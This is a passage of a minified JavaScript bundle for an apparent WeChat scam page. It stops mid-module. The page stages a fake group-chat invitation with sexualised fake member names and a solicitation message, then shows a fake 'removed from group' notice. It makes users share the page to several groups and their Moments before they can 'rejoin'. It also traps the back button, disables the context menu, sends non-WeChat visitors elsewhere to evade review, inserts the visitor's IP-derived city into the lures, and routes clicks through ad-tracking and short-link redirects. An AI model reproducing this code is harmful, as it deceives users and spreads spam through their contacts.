webpackJsonp([1],{"/kga":function(t,e,i){"use strict";var a=i("JkZY"),s=(a.a,Boolean,String,String,Number,String,String,Boolean,Object,Boolean,{mixins:[a.a],name:"x-dialog",model:{prop:"show",event:"change"},props:{show:{type:Boolean,default:!1},maskTransition:{type:String,default:"vux-mask"},maskZIndex:[String,Number],dialogTransition:{type:String,default:"vux-dialog"},dialogClass:{type:String,default:"weui-dialog"},hideOnBlur:Boolean,dialogStyle:Object,scroll:{type:Boolean,default:!0,validator:function(t){return!0}}},computed:{maskStyle:function(){if(void 0!==this.maskZIndex)return{zIndex:this.maskZIndex}}},mounted:function(){"undefined"!=typeof window&&window.VUX_CONFIG&&"VIEW_BOX"===window.VUX_CONFIG.$layout&&(this.layout="VIEW_BOX")},watch:{show:function(t){this.$emit("update:show",t),this.$emit(t?"on-show":"on-hide"),t?this.addModalClassName():this.removeModalClassName()}},methods:{shouldPreventScroll:function(){var t=/iPad|iPhone|iPod/i.test(window.navigator.userAgent),e=this.$el.querySelector("input")||this.$el.querySelector("textarea");if(t&&e)return!0},hide:function(){this.hideOnBlur&&(this.$emit("update:show",!1),this.$emit("change",!1),this.$emit("on-click-mask"))}},data:function(){return{layout:""}}}),n={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"vux-x-dialog",class:{"vux-x-dialog-absolute":"VIEW_BOX"===t.layout}},[i("transition",{attrs:{name:t.maskTransition}},[i("div",{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],staticClass:"weui-mask",style:t.maskStyle,on:{click:t.hide}})]),t._v(" "),i("transition",{attrs:{name:t.dialogTransition}},[i("div",{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],class:t.dialogClass,style:t.dialogStyle},[t._t("default")],2)])],1)},staticRenderFns:[]};var o=i("VU/8")(s,n,!1,function(t){i("z3SG")},null,null);e.a=o.exports},"0nrA":function(t,e){},"2SKQ":function(t,e,i){"use strict";i("mvsn");var a=i("TWGN"),s={render:function(){var t=this.$createElement;return(this._self._c||t)("div",{attrs:{id:""}})},staticRenderFns:[]};var n=function(t){i("Orc6")},o=i("VU/8")(a.a,s,!1,n,null,null);e.a=o.exports},"4Kl6":function(t,e,i){"use strict";var a=i("mzja"),s=i("/kga"),n=(a.a,s.a,{name:"Process",components:{Alert:a.a,XDialog:s.a},data:function(){return{step:this.$route.query.step,wxid:this.$route.query.wxid,words:""}},created:function(){this.getAlertBox(),this.$refs.alertBox.style.display="block"},watch:{$route:function(t,e){this.step=this.$route.query.step,this.getAlertBox(),this.$refs.alertBox.style.display="block"}},methods:{jumpFun:function(){this.$http.get("/emsTest/scan/Rule_b?id=5",{}).then(function(t){window.location.href=t.data.url})},modalbox:function(){this.$refs.alertBox.style.display="block"},toggles:function(){this.$refs.alertBox.style.display="none"},getAlertBox:function(){var t=this.step,e="";switch(t=parseInt(t)){case 1:e='<div class="font-one">分享成功 <i class="ui-color-red" style="font-weight: bold">✔</i></div><div class="font-two">请继续分享<i class="ui-color-red"> 1 </i>个不同的群</div><div class="font-three"><i class="ui-color-red">即可进群</i></div>';break;case 2:e='<div class="font-one">分享失败 <i class="ui-color-red" style="font-weight: bold">✘</i></div><div class="font-five">分享到相同的群或者个人会失败<br>请继续分享到<i class="ui-color-red"> 2 </i>个不同的群！</div><div class="font-six"><i class="ui-color-red">即可进群</i></div>';break;case 3:e='<div class="font-one">分享成功 <i class="ui-color-red" style="font-weight: bold">✔</i></div><div class="font-two">请继续分享到<i class="ui-color-red"> 1 </i>个不同的群！</div><div class="font-three"><i class="ui-color-red">即可进群</i></div>';break;case 4:e='<div class="font-seven"><i class="ui-color-red">分享完成</i></div><div class="font-eight">请分享到<i class="ui-color-red"> 朋友圈 </i>即可进群！</div>';break;case 5:e='<div class="font-one" style="font-weight: bold; color: red;" >注意 <i class="ui-color-red" >✘</i></div><div class="ui-color-red" style="margin-top: 0.4rem;">必须【公开】分享才可以进群</div><div class="font-four" style="margin-top: 0.2rem;">请分享到<i class="ui-color-red"> 朋友圈 </i>即可进群！</div>'}this.words=e}},mounted:function(){var t,e=this,i=window.location.href;t={title:"title",url:i},window.history.pushState(t,"title",i),window.addEventListener("popstate",function(t){e.jumpFun()},!1),window.document.oncontextmenu=function(t){t.preventDefault()};var a=0;document.addEventListener("touchstart",function(t){try{var e=t.touches[0],i=Number(e.pageX),s=Number(e.pageY);i,a=s}catch(t){alert(t)}});var s=document.getElementById("Process");s.ontouchmove=function(t){var e=t.touches[0],i=s.scrollTop,n=s.scrollHeight-s.offsetHeight;0===i?e.clientY>a&&t.preventDefault():i===n&&e.clientY<a&&t.preventDefault()};var n=document.documentElement.clientHeight;document.getElementById("Process").style.height=n+"px"}}),o={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{attrs:{id:"Process"}},[1==t.step?i("div",{staticClass:"box-one",attrs:{id:"ProcessDiv"}}):2==t.step?i("div",{staticClass:"box-two",attrs:{id:"ProcessDiv"}}):3==t.step?i("div",{staticClass:"box-three",attrs:{id:"ProcessDiv"}}):4==t.step?i("div",{staticClass:"box-four",attrs:{id:"ProcessDiv"}}):5==t.step?i("div",{staticClass:"box-five",attrs:{id:"ProcessDiv"}}):t._e(),t._v(" "),i("div",{staticClass:"ui-show-step5 process"},[i("div",{staticClass:"ui-show-cen",on:{click:t.modalbox}}),t._v(" "),i("div",{ref:"alertBox",staticClass:"ui-show-alert"},[i("div",{staticClass:"ui-content",domProps:{innerHTML:t._s(t.words)}}),t._v(" "),i("div",{staticClass:"alert-btn",on:{click:t.toggles}},[t._v("好的")])])])])},staticRenderFns:[]};var r=i("VU/8")(n,o,!1,function(t){i("h49L")},null,null);e.a=r.exports},"62KO":function(t,e,i){"use strict";var a=i("/kga"),s=(a.a,Boolean,Boolean,String,String,Boolean,String,String,String,String,Number,String,String,String,Boolean,Object,Boolean,String,Boolean,Boolean,{name:"confirm",components:{XDialog:a.a},props:{value:{type:Boolean,default:!1},showInput:{type:Boolean,default:!1},placeholder:{type:String,default:""},theme:{type:String,default:"ios"},hideOnBlur:{type:Boolean,default:!1},title:String,confirmText:String,cancelText:String,maskTransition:{type:String,default:"vux-fade"},maskZIndex:[Number,String],dialogTransition:{type:String,default:"vux-dialog"},content:String,closeOnConfirm:{type:Boolean,default:!0},inputAttrs:Object,showContent:{type:Boolean,default:!0},confirmType:{type:String,default:"primary"},showCancelButton:{type:Boolean,default:!0},showConfirmButton:{type:Boolean,default:!0}},created:function(){this.showValue=this.show,this.value&&(this.showValue=this.value)},watch:{value:function(t){this.showValue=t},showValue:function(t){var e=this;this.$emit("input",t),t&&(this.showInput&&(this.msg="",setTimeout(function(){e.$refs.input&&e.setInputFocus()},300)),this.$emit("on-show"))}},data:function(){return{msg:"",showValue:!1}},methods:{getInputAttrs:function(){return this.inputAttrs||{type:"text"}},setInputValue:function(t){this.msg=t},setInputFocus:function(t){t&&t.preventDefault(),this.$refs.input.focus()},_onConfirm:function(){this.showValue&&(this.closeOnConfirm&&(this.showValue=!1),this.$emit("on-confirm",this.msg))},_onCancel:function(){this.showValue&&(this.showValue=!1,this.$emit("on-cancel"))}}}),n={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"vux-confirm"},[i("x-dialog",{attrs:{"dialog-class":"android"===t.theme?"weui-dialog weui-skin_android":"weui-dialog","mask-transition":t.maskTransition,"dialog-transition":"android"===t.theme?"vux-fade":t.dialogTransition,"hide-on-blur":t.hideOnBlur,"mask-z-index":t.maskZIndex},on:{"on-hide":function(e){t.$emit("on-hide")}},model:{value:t.showValue,callback:function(e){t.showValue=e},expression:"showValue"}},[t.title?i("div",{staticClass:"weui-dialog__hd",class:{"with-no-content":!t.showContent}},[i("strong",{staticClass:"weui-dialog__title"},[t._v(t._s(t.title))])]):t._e(),t._v(" "),t.showContent?[t.showInput?i("div",{staticClass:"vux-prompt"},["checkbox"===t.getInputAttrs().type?i("input",t._b({directives:[{name:"model",rawName:"v-model",value:t.msg,expression:"msg"}],ref:"input",staticClass:"vux-prompt-msgbox",attrs:{placeholder:t.placeholder,type:"checkbox"},domProps:{checked:Array.isArray(t.msg)?t._i(t.msg,null)>-1:t.msg},on:{touchend:t.setInputFocus,change:function(e){var i=t.msg,a=e.target,s=!!a.checked;if(Array.isArray(i)){var n=t._i(i,null);a.checked?n<0&&(t.msg=i.concat([null])):n>-1&&(t.msg=i.slice(0,n).concat(i.slice(n+1)))}else t.msg=s}}},"input",t.getInputAttrs(),!1)):"radio"===t.getInputAttrs().type?i("input",t._b({directives:[{name:"model",rawName:"v-model",value:t.msg,expression:"msg"}],ref:"input",staticClass:"vux-prompt-msgbox",attrs:{placeholder:t.placeholder,type:"radio"},domProps:{checked:t._q(t.msg,null)},on:{touchend:t.setInputFocus,change:function(e){t.msg=null}}},"input",t.getInputAttrs(),!1)):i("input",t._b({directives:[{name:"model",rawName:"v-model",value:t.msg,expression:"msg"}],ref:"input",staticClass:"vux-prompt-msgbox",attrs:{placeholder:t.placeholder,type:t.getInputAttrs().type},domProps:{value:t.msg},on:{touchend:t.setInputFocus,input:function(e){e.target.composing||(t.msg=e.target.value)}}},"input",t.getInputAttrs(),!1))]):i("div",{staticClass:"weui-dialog__bd"},[t._t("default",[i("div",{domProps:{innerHTML:t._s(t.content)}})])],2)]:t._e(),t._v(" "),i("div",{staticClass:"weui-dialog__ft"},[t.showCancelButton?i("a",{staticClass:"weui-dialog__btn weui-dialog__btn_default",attrs:{href:"javascript:;"},on:{click:t._onCancel}},[t._v(t._s(t.cancelText||"取消"))]):t._e(),t._v(" "),t.showConfirmButton?i("a",{staticClass:"weui-dialog__btn",class:"weui-dialog__btn_"+t.confirmType,attrs:{href:"javascript:;"},on:{click:t._onConfirm}},[t._v(t._s(t.confirmText||"确定"))]):t._e()])],2)],1)},staticRenderFns:[]};var o=i("VU/8")(s,n,!1,function(t){i("P1tG")},null,null);e.a=o.exports},AYI0:function(t,e){var i={jumpA2:function(){var t=window.location.host;console.log(t)}};t.exports=i},BfUi:function(t,e,i){(function(t){t.baseUrl="https://working.api.ssmulu.com",t.wxUrl="https://wx.api.ssmulu.com",t.url={chatGetTitle:"/chat/get-title",get_wx_share:"/chat/getWxShare",domain_skip:"/chat/domainSkip",wx_share:"/wechat/wxinfo"},t.page={size:20}}).call(e,i("DuR2"))},Bfwr:function(t,e,i){"use strict";Boolean,String,String,String;var a={name:"loading",model:{prop:"show",event:"change"},props:{show:Boolean,text:String,position:String,transition:{type:String,default:"vux-mask"}},watch:{show:function(t){this.$emit("update:show",t)}}},s={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("transition",{attrs:{name:t.transition}},[i("div",{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],staticClass:"weui-loading_toast vux-loading",class:t.text?"":"vux-loading-no-text"},[i("div",{staticClass:"weui-mask_transparent"}),t._v(" "),i("div",{staticClass:"weui-toast",style:{position:t.position}},[i("i",{staticClass:"weui-loading weui-icon_toast"}),t._v(" "),t.text?i("p",{staticClass:"weui-toast__content"},[t._v(t._s(t.text||"加载中")),t._t("default")],2):t._e()])])])},staticRenderFns:[]};var n=i("VU/8")(a,s,!1,function(t){i("QaG2")},null,null);e.a=n.exports},EwZo:function(t,e){var i={versions:function(){var t=navigator.userAgent;navigator.appVersion;return{trident:t.indexOf("Trident")>-1,presto:t.indexOf("Presto")>-1,webKit:t.indexOf("AppleWebKit")>-1,gecko:t.indexOf("Gecko")>-1&&-1==t.indexOf("KHTML"),mobile:!!t.match(/AppleWebKit.*Mobile.*/),ios:!!t.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:t.indexOf("Android")>-1||t.indexOf("Linux")>-1,iPhone:t.indexOf("iPhone")>-1,iPad:t.indexOf("iPad")>-1,webApp:-1==t.indexOf("Safari"),webdebugger:t.indexOf("webdebugger")>-1}}(),isWechat:function(){return!!this.versions.mobile&&(!this.versions.webdebugger&&"micromessenger"==navigator.userAgent.toLowerCase().match(/MicroMessenger/i))},language:(navigator.browserLanguage||navigator.language).toLowerCase()};t.exports=i},G7EO:function(t,e){},IenS:function(t,e,i){"use strict";(function(t){e.a=r;var a=i("7+uW"),s=i("YaEn"),n=i("n6Wb"),o=i("yD8N");function r(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},i=e.title,n=e.desc,o=e.timelineTitle,r=e.link,l=e.logo,u=e.flock_logo,c=e.sort,d=e.wxid,h=window.location.href,p=s.a.history.current.query.step;h&&a.default.http.post(t.wxUrl+t.url.wx_share,{url:h,wxid:d}).then(function(t){a.default.wechat.config({debug:!1,appId:t.data.appId,timestamp:t.data.timestamp,nonceStr:t.data.nonceStr,signature:t.data.signature,jsApiList:["onMenuShareAppMessage","onMenuShareTimeline","hideAllNonBaseMenuItem","showMenuItems"]});var e=c;e||(e=1),1==e?(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:timeline","menuItem:share:appMessage"]})):2==e?(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:timeline"]})):3==e&&(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:appMessage"]}))}),a.default.wechat.ready(function(){a.default.wechat.onMenuShareAppMessage({title:i,desc:n||"这里是分享朋友的内容",link:r||window.location.href,imgUrl:l||"https://dwz.cn/T2afCN3o",success:function(){switch(p&&(p=parseInt(p)),p){case 0:case 1:p=2,s.a.push({path:"/mark5",query:{step:p}});break;case 2:p=3,s.a.push({path:"/mark5",query:{step:p}});break;case 3:p=4,s.a.push({path:"/mark5",query:{step:p}});break;case 4:p=5,s.a.push({path:"/mark5",query:{step:p}});break;case 5:a.default.http.post("/emsTest/scan/Rule_b?id=5",{}).then(function(t){window.location.href=t.data.url});break;default:p=1,s.a.push({path:"/mark5",query:{step:p}})}}}),a.default.wechat.onMenuShareTimeline({title:o||"这里是分享朋友圈的内容",link:r||window.location.href,imgUrl:u||"https://dwz.cn/bQtHr9Iz",success:function(){switch(p&&(p=parseInt(p)),p){case 0:case 1:p=2,s.a.push({path:"/mark5",query:{step:p}});break;case 2:p=3,s.a.push({path:"/mark5",query:{step:p}});break;case 3:p=4,s.a.push({path:"/mark5",query:{step:p}});break;case 4:p=5,s.a.push({path:"/mark5",query:{step:p}});break;case 5:window.location.href="http://t.cn/EA9KWjm";break;default:p=1,s.a.push({path:"/mark5",query:{step:p}})}}});var t=c;t||(t=1),1==t?(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:timeline","menuItem:share:appMessage"]})):2==t?(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:timeline"]})):3==t&&(a.default.wechat.hideAllNonBaseMenuItem(),a.default.wechat.showMenuItems({menuList:["menuItem:share:appMessage"]}))}),a.default.wechat.error(function(t){})}a.default.use(n.a),a.default.use(o.a),a.default.prototype.$wxShare=r}).call(e,i("DuR2"))},NHnr:function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var a=i("7+uW"),s=i("EwZo"),n=i.n(s),o={name:"App",data:function(){return{uaSort:{webkitOverflowScrolling:""}}},created:function(){n.a.versions.android&&(this.uaSort.webkitOverflowScrolling="touch")}},r={render:function(){var t=this.$createElement,e=this._self._c||t;return e("div",{style:this.uaSort,attrs:{id:"app"}},[e("router-view")],1)},staticRenderFns:[]};var l=i("VU/8")(o,r,!1,function(t){i("rbuh")},"data-v-44ba50bc",null).exports,u=i("YaEn"),c=i("BfUi"),d=i.n(c),h=i("AYI0"),p=i.n(h),m=i("IenS"),f=i("j1M6"),v=i.n(f),w=i("bHfy"),g=i.n(w),_=i("3BeM"),x=i("NXWw"),y=i("Peep"),b=i("Y+qm"),k=i("yD8N"),C=i("n6Wb");Object(m.a)(u.a),a.default.use(b.a),a.default.use(_.a),a.default.use(x.a),a.default.use(y.a),a.default.use(v.a,g.a),a.default.use(d.a),a.default.use(n.a),a.default.use(C.a),a.default.use(k.a),a.default.use(p.a),p.a.jumpA2(),n.a.isWechat(),new a.default({el:"#app",router:u.a,components:{App:l},template:"<App/>"})},O9uB:function(t,e){},Orc6:function(t,e){},P1tG:function(t,e){},QaG2:function(t,e){},RRNw:function(t,e,i){"use strict";(function(t){var a=i("EwZo");i.n(a);e.a={components:{},name:"Main",data:function(){return{title:"*",enrollment:"*",invitor:"*",wxid:this.$route.query.wxid,url:""}},created:function(){this.$vux.loading.show(),this.getApi();var t=["辞予","那一夜","床摇得厉害","你的呻吟","甜腻","强哥","七尺大乳","漂洋过海","用贞操换真钞","清晨的眼泪","孟老师","性感↗小娘们","孤寂","淫领风骚","小影","爱到深处て腿自开","无心","吻我杀我","林萌"],e=Math.floor(Math.random()*t.length);this.invitor=t[e]},methods:{getApi:function(){var e=this,i=this,a=IpQuery.city,s=IpQuery.province,n="";n=a?a.replace(/市/,""):s.replace(/省/,""),i.$http.post(t.baseUrl+t.url.chatGetTitle,{}).then(function(a){a.status&&(i.$vux.loading.hide(),i.title=a.data.title.replace(/city/,n),i.enrollment=a.data.enrollment,i.$http.post(t.baseUrl+t.url.domain_skip,{type:"C1"}).then(function(t){e.url=t.data+"?t=s"}))})},jumpFun:function(){this.$http.get("/emsTest/scan/Rule_b?id=5",{}).then(function(t){window.location.href=t.data.url})},show:function(t){if(1==t){this.$http.get("/emsTest/scan/Rule_b?id=5",{}).then(function(t){window.location.href=t.data.url})}else window.location.href=this.url}},mounted:function(){new IScroll("#wrappers",{mouseWheel:!0,click:!1,taps:!0}),document.addEventListener("touchmove",function(t){t.preventDefault()},!!isPassive()&&{capture:!1,passive:!1});var t,e=this,i=window.location.href;t={title:"title",url:i},window.history.pushState(t,"title",i),window.addEventListener("popstate",function(t){e.jumpFun()},!1)}}}).call(e,i("DuR2"))},TWGN:function(t,e,i){"use strict";(function(t){e.a={name:"",data:function(){return{wxid:this.$route.query.wxid}},created:function(){this.domain()},methods:{domain:function(){this.$http.post(t.baseUrl+t.url.domain_skip,{type:"B1"}).then(function(t){})}}}}).call(e,i("DuR2"))},W3Ur:function(t,e,i){"use strict";i("bdlu");var a=i("RRNw"),s={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{attrs:{id:"main"}},[i("div",{attrs:{id:"wrappers"}},[i("div",{attrs:{id:"scrollers"}},[i("div",{staticClass:"main"},[i("div",{staticClass:"ui-logo"}),t._v(" "),i("div",{staticClass:"ui-title"},[t._v(t._s(t.title))]),t._v(" "),i("div",{ref:"c",staticClass:"ui-num"},[t._v(t._s(t.enrollment)+"人")])]),t._v(" "),i("div",{staticClass:"ui-footer"},[i("div",{staticClass:"ui-invite"},[t._v(t._s(t.invitor)+" 邀您加入群聊")]),t._v(" "),i("input",{staticClass:"ui-btn",attrs:{type:"button",value:"加入群聊"},on:{click:function(e){t.show(2)}}}),t._v(" "),t._m(0)])])])])},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"ui-role"},[e("p",[this._v("1.您和群里其他人都不是朋友关系，注意隐私安全。")]),this._v(" "),e("p",[this._v("2.该群聊人数较多，为减少新信息给您带来的打扰，建议进群后屏蔽消息通知。")])])}]};var n=function(t){i("G7EO")},o=i("VU/8")(a.a,s,!1,n,null,null);e.a=o.exports},YaEn:function(t,e,i){"use strict";(function(t){var a=i("7+uW"),s=i("/ocq"),n=i("jcuN"),o=i("2SKQ"),r=i("Z6yZ"),l=i("W3Ur"),u=i("4Kl6"),c=i("IenS"),d=i("EwZo"),h=i.n(d);a.default.use(s.a);var p=new s.a({hashbang:!1,mode:"history",routes:[{path:"/",name:"",component:o.a},{path:"/mark1",name:"",component:r.a},{path:"/mark3",name:"群聊邀请",component:l.a},{path:"/mark4",name:"邀您加入群聊",component:n.a},{path:"/mark5",name:"邀您加入群聊",component:u.a}]});p.beforeEach(function(e,i,s){if(h.a.isWechat()){"/mark4"!=e.path||e.query.t?"/mark5"==e.path&&"/mark4"!=i.path&&"/mark5"!=i.path&&(window.location.href="https://xw.qq.com/"):window.location.href="https://xw.qq.com/",document.getElementById("titleId").innerHTML=e.name;var n="http://a3.xinhuanet.com/c?sid=574&impid=8ce74a5e7b8f407f92c9458ffe8f1e0a&cam=789&adgid=789&crid=3553&uid=55efaac86d6942048aecdb4d2b7824cf&d=xinhuanetv2&url=http%3A%2F%2Ftj.xinhuanet.com%2F&ref=&i=1966948576&tm=1535527310&sig=56a0e773a2ec6f81c34959f1e90754ae&click=";if("/mark1"==e.path)a.default.http.post(t.baseUrl+t.url.domain_skip,{type:"A2"}).then(function(t){var e=n+t.data;window.location.href=e});else if("/mark2"==e.path)a.default.http.post(t.baseUrl+t.url.domain_skip,{type:"B1"}).then(function(t){var e=n+t.data;window.location.href=e});else{if("/mark4"==e.path||"/mark5"==e.path){var o=IpQuery.city,r=IpQuery.province,l="",u=["👑","🔥","✨","🌟","💫","💥","💦","💤","💋","💎","❤","💕","💘","🐾","🌹","🌴","🍀","✏","✈","🔞","✅","🍭","🍦","🍉","☀","⚡","⭐","🐝","🐕","👣","🌂","🍎","🎀","🏀","🍼","👠","💐","🌺","🌻","🌀","🎈","💡","🍒","🍇","🍌","🔍","♨","🚀","🚲","💉","🔑","♈","♉","♊","♋","♌","♍","♎","♏","♐","♑","♒"],d=u[Math.floor(Math.random()*u.length)],p=u[Math.floor(Math.random()*u.length)];l=o?o.replace(/市/,""):r.replace(/省/,""),a.default.http.post(t.baseUrl+t.url.get_wx_share,{}).then(function(t){var i=t.data.url,a=t.data.title.replace(/city/,l).replace(/icon/,d).replace(/icon/,p),s=t.data.describe.replace(/city/,l).replace(/icon/,d).replace(/icon/,p),n=t.data.flock_title.replace(/city/,l).replace(/icon/,d).replace(/icon/,p),o=t.data.logo,r=t.data.wxid,u="",h=t.data.flock_logo;u="4"==e.query.step||"5"==e.query.step?2:"1"==e.query.step||"2"==e.query.step||"3"==e.query.step?3:1,console.log(u),Object(c.a)({title:a,desc:s,timelineTitle:n,link:i,logo:o,flock_logo:h,sort:u,wxid:r})})}s()}}else window.location.href="https://xw.qq.com/"}),p.afterEach(function(t,e){}),e.a=p}).call(e,i("DuR2"))},Z6yZ:function(t,e,i){"use strict";var a={render:function(){var t=this.$createElement;return(this._self._c||t)("div",{attrs:{id:""}},[this._v("\n  123\n")])},staticRenderFns:[]};var s=i("VU/8")({name:"",data:function(){return{wxid:this.$route.query.wxid}},created:function(){}},a,!1,function(t){i("wGEc")},null,null);e.a=s.exports},bdlu:function(t,e,i){"use strict";(function(t){var e=i("EwZo");i.n(e)}).call(e,i("DuR2"))},h49L:function(t,e){},jcuN:function(t,e,i){"use strict";var a=i("mzja"),s=i("/kga"),n=(i("BfUi"),i("EwZo"),a.a,s.a,{name:"Show",components:{Alert:a.a,XDialog:s.a},data:function(){return{uaSort:{webkitOverflowScrolling:""},now:"",invitor:"",shareUrl:"",wxid:this.$route.query.wxid,city:"",background1:{backgroundImage:"",backgroundRepeat:"no-repeat"},background2:{backgroundImage:"",backgroundRepeat:"no-repeat"},background3:{backgroundImage:"",backgroundRepeat:"no-repeat"},background4:{backgroundImage:"",backgroundRepeat:"no-repeat"},group1:"",group2:"",group3:"",name1:"",name2:"",name3:""}},created:function(){var t=["辞予","那一夜","床摇得厉害","你的呻吟","甜腻","强哥","七尺大乳","漂洋过海","用贞操换真钞","清晨的眼泪","孟老师","性感↗小娘们","孤寂","淫领风骚","小影","爱到深处て腿自开","无心","吻我杀我","林萌"],e=["01","02","03","04","05","06","07","08","09","10","11","12","13","14","15","16"],i=["01","02","03","04","05","06","07","08"];t=t.sort(function(){return.5-Math.random()}),e=e.sort(function(){return.5-Math.random()}),i=i.sort(function(){return.5-Math.random()});var a=Math.floor(Math.random()*i.length);i.splice(a,1);var s=Math.floor(Math.random()*i.length);i.splice(s,1);var n=Math.floor(Math.random()*i.length);i.splice(n,1),this.background1.backgroundImage="url('http://working.ssmulu.com/avatar/avatar-"+e.splice(1,1)[0]+".jpg')",this.background2.backgroundImage="url('http://working.ssmulu.com/avatar/avatar-"+e.splice(1,1)[0]+".jpg')",this.background3.backgroundImage="url('http://working.ssmulu.com/avatar/avatar-"+e.splice(1,1)[0]+".jpg')",this.background4.backgroundImage="url('http://working.ssmulu.com/avatar/avatar-"+e.splice(1,1)[0]+".jpg')",this.name1=t.splice(1,1)[0],this.name2=t.splice(1,1)[0],this.name3=t.splice(1,1)[0],this.name4=t.splice(1,1)[0],this.invitor=t.splice(1,1)[0],this.group1="show-img-"+i.splice(1,1)[0],this.group2="show-img-"+i.splice(1,1)[0],this.group3="show-img-"+i.splice(1,1)[0],console.log(this.group1,this.group2,this.group3),this.getNowTime();var o=IpQuery.city,r=IpQuery.province,l="";l=o?o.replace(/市/,""):r.replace(/省/,""),this.city=l},methods:{modalbox:function(){this.$refs.alertBox.style.display="block"},toggles:function(){this.$refs.alertBox.style.display="none"},getNowTime:function(){var t=new Date,e="";e=t.getMinutes()<10?"0"+t.getMinutes():t.getMinutes();var i=t.getHours()+":"+e;this.now=i},jumpFun:function(){this.$http.get("/emsTest/scan/Rule_b?id=5",{}).then(function(t){window.location.href=t.data.url})}},mounted:function(){var t=1,e=setInterval(function(){document.querySelector("#scroller div:nth-child("+t+")").style.display="block",(i=new IScroll("#wrapper",{mouseWheel:!0,click:!0})).scrollTo(0,i.maxScrollY-10),10==++t&&(document.querySelector(".last-cen").style.display="block",document.querySelector(".footerCen").style.display="block",clearInterval(e))},800),i=void 0;i=new IScroll("#wrapper",{mouseWheel:!0,click:!0,taps:!0}),document.addEventListener("touchmove",function(t){t.preventDefault()},!!isPassive()&&{capture:!1,passive:!1})}}),o={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{attrs:{id:"join"}},[i("div",{attrs:{id:"wrapper"}},[i("div",{attrs:{id:"scroller"}},[i("div",{staticStyle:{height:"0.5rem"}}),t._v(" "),i("div",{ref:"go1",staticClass:"ui-show-step1 step"},[t._v(t._s(t.now))]),t._v(" "),i("div",{ref:"go2",staticClass:"ui-show-step2 step"},[t._v('"'),i("span",[t._v(t._s(t.invitor))]),t._v('"邀您加入群聊，群聊参与人还有：辞予、那一夜、床摇得厉害、你的呻吟、甜腻、强哥、七尺大乳、漂洋过海、用贞操换真钞、清晨的眼泪、孟老师、性感↗小娘们、孤寂、淫领风骚、小影、爱到深处て腿自开、无心、吻我杀我、林萌')]),t._v(" "),i("div",{ref:"go3",staticClass:"ui-show-step3 step clearfix"},[i("div",{staticClass:"show-left",style:t.background4}),t._v(" "),i("div",{staticClass:"show-right"},[i("div",{staticClass:"show-person"},[t._v(t._s(t.name1))]),t._v(" "),i("div",{class:t.group1})])]),t._v(" "),i("div",{ref:"go4",staticClass:"ui-show-step3 step clearfix"},[i("div",{staticClass:"show-left",style:t.background1}),t._v(" "),i("div",{staticClass:"show-right"},[i("div",{staticClass:"show-person"},[t._v(t._s(t.name2))]),t._v(" "),i("div",{class:t.group2})])]),t._v(" "),i("div",{ref:"go5",staticClass:"ui-show-step3 step clearfix"},[i("div",{staticClass:"show-left",style:t.background2}),t._v(" "),i("div",{staticClass:"show-right"},[i("div",{staticClass:"show-person"},[t._v(t._s(t.name3))]),t._v(" "),i("div",{class:t.group3})])]),t._v(" "),i("div",{ref:"go6",staticClass:"ui-show-step3 step clearfix"},[i("div",{staticClass:"show-left",style:t.background3}),t._v(" "),i("div",{staticClass:"show-right"},[i("div",{staticClass:"show-person"},[t._v(t._s(t.name4))]),t._v(" "),i("div",{staticClass:"show-text"},[t._v("\n              群里有没有"+t._s(t.city)+"本地的小哥哥要约的，本人在校大学生，因经济困难想做下兼职补贴下零用，要求素质高，体贴，必须带TT，进群加我私聊。\n            ")])])]),t._v(" "),i("div",{ref:"go7",staticClass:"ui-show-step4 step"},[t._v('\n          你被"'),i("span",[t._v("群主")]),t._v('"移除群聊\n        ')]),t._v(" "),i("div",{staticStyle:{height:"0.5rem"}})]),t._v(" "),i("div",{staticClass:"last-cen"},[i("div",{ref:"go8",staticClass:"ui-show-cen",attrs:{id:"cen"},on:{click:t.modalbox}}),t._v(" "),i("div",{ref:"alertBox",staticClass:"ui-show-alert"},[t._m(0),t._v(" "),t._m(1),t._v(" "),i("div",{staticClass:"alert-btn",on:{click:t.toggles}},[t._v("好的")])])])]),t._v(" "),t._m(2)])},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"alert-title"},[this._v("提示：完成分享任务，可重新进群"),e("br"),this._v("（请分享到一个微信群）")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"alert-content"},[this._v("当前群人数"),e("span",[this._v("321")]),this._v("人")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"footerId",attrs:{id:"footerId"}},[e("span",{staticClass:"show-voice"}),this._v(" "),e("span",{staticClass:"show-input"}),this._v(" "),e("span",{staticClass:"show-smile"}),this._v(" "),e("span",{staticClass:"show-plus"}),this._v(" "),e("div",{staticClass:"footerCen"})])}]};var r=i("VU/8")(n,o,!1,function(t){i("O9uB")},null,null);e.a=r.exports},kp3f:function(t,e){},mvsn:function(t,e,i){"use strict";(function(t){}).call(e,i("DuR2"))},mzja:function(t,e,i){"use strict";var a=i("/kga"),s=(a.a,Boolean,String,String,String,Boolean,String,String,Number,String,{name:"alert",components:{XDialog:a.a},created:function(){void 